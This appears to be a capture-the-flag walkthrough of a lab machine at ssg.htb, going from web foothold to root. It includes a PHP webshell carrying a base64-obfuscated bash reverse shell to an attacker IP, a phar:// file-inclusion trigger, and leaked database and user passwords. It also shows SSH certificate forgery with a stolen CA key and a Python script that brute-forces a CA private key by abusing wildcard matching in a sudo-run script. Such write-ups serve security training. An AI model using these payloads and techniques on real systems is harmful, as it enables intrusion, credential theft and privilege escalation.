## Foothold

Create webshell.php

```
<?php system('echo -n YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDEvOTAwMSAwPiYxJwo= | base64 -d | bash'); ?>
```

Zip the webshell in a zip file (you cannot bypass the filter on the webserver)

Upload the zipfile on the server

Get the zipfile location on the server

```
itrc.ssg.htb/uploads/bd8cd6036fa410858f7b72f6370d005d57995afc.zip
```

Prepare the netcat listener

```
nc -lnvp 9001
```

Run the phar wrapper

```
http://itrc.ssg.htb/?page=phar://uploads/bd8cd6036fa410858f7b72f6370d005d57995afc.zip/revshell
```

---

## www-data

db info

```
$dsn = "mysql:host=db;dbname=resourcecenter;";
$dbusername = "jj";
$dbpassword = "ugEG5rR5SG8uPd";
```

unzip the big zipfile you find `msainrinstil` creds

```
msainristil:82yards2closeit
```

unzipping other files will give you some rsa keys (we won't use them anyway)

---

## msainristil

In `~/decommission_old_ca` there are the CA keys. We can use them to sign user's keys and login to the box.

I logged in as root on my box and generated a new keypair with a comment.

```
ssh-keygen -C "root@ssg.htb"
```

I put my `id_rsa.pub` key on the box in `/tmp` and then run this command to sign the key with CA's key

```
msainristil@itrc:~/decommission_old_ca$ ssh-keygen -s ca-itrc -I root -n root -V +52w -f /tmp/id_rsa-cert.pub /tmp/id_rsa.pub
```

Then i put `/tmp/id_rsa-cert.pub` on my box and next i logged in to the box as root with this command

```
┌─[✗]─[root@parrot]─[~/.ssh]
└──╼ #ssh root@ssg.htb -i id_rsa -o CertificateFile=./id_rsa-cert.pub
```

---

## zzinter on port 2222

```
ssh zzinter@ssg.htb -i $HOME/.ssh/id_rsa -o CertificateFile=zzinter-cert.pub -p 2222
```

`sudo -l` tell use we can run `/opt/sign_key.sh` as sudo

```
zzinter@ssg:~$ sudo -l
Matching Defaults entries for zzinter on ssg:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bi
n\:/snap/bin,
    use_pty

User zzinter may run the following commands on ssg:
    (root) NOPASSWD: /opt/sign_key.sh
```

The script looks like it's just signing a key using the specified CA.

The decomissioned CA priv key we got access to before doesn't buy us anything. If we try to use it to sign a key, it won't give us access to the machine.

Trying to find other private ssh keys doesn't buy us anything either.

### ca-cert cracking and signing

We read inside the script his line `echo "Error: Use API for signing with this CA."` which we tried before, but we got some kind of error stating that only admin can sign with API.
At this point what we might try to do, is bruteforcing the key. The comparisong is being done using `==`, that means we can use the wildcard `*` to match any character.
e.g. If we provide a key like `-----BEGIN OPENSSH PRIVATE KEY-----*` it is going to match.
The following handmade script will do the trick.

```
#!/usr/bin/python3
import subprocess
import sys

chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789+/=- "
key = "-----BEGIN OPENSSH PRIVATE KEY-----"
ctr = 0

while True:
    if ctr == 0:
        key += "\n"
        print(key)
    if "-----END OPENSSH PRIVATE KEY-----" in key:
        break
    for char in chars:
        f = open("/tmp/temp.txt", "w")
        f.write(key+char+"*")
        f.close()
        command = ["sudo", "/opt/sign_key.sh", "/tmp/temp.txt", "/home/zzinter/.ssh/id_rsa.pub", "support", "support", "1"]
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if "Error: Use API for signing with this CA." in result.stdout:
            key += char
            ctr = (ctr + 1) % 70
            break
        elif char == chars[-1]:
            ctr = 0

print(key)
```

We run this script on the target machine and get the CA's private key.

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc
rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ
AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA
cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV
QBAgM=
-----END OPENSSH PRIVATE KEY-----
```

Next we take sign_key.sh on our machine and run it to sign our pubkey

```
./sign_key.sh ca-cert $HOME/.ssh/id_rsa.pub root root_user 1
```

and finally we login as root on the target

```
ssh -p 2222 root@ssg.htb -i $HOME/.ssh/id_rsa -o CertificateFile=id_rsa-cert.pub
```

---
